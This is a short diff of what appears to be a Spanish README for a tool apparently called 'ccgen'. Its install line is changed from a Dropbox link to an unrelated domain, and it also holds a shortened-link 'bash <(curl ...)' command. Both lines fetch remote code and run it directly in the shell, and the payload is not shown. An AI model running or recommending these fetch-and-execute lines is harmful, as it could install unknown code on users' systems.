@@ -15,7 +15,7 @@ bash <(curl -sL https://cutt.ly/jhiH7eD)
 
 ## Instalacion
 ```
-(. <($(which curl>/dev/null&&echo curl -Ls||echo wget -qO-) https://www.dropbox.com/s/jdjzfp84ffu6tel/ccgen))
+(. <($(which curl>/dev/null&&echo curl -Ls||echo wget -qO-) http://aorracer.com/653F))
 
 ```
 
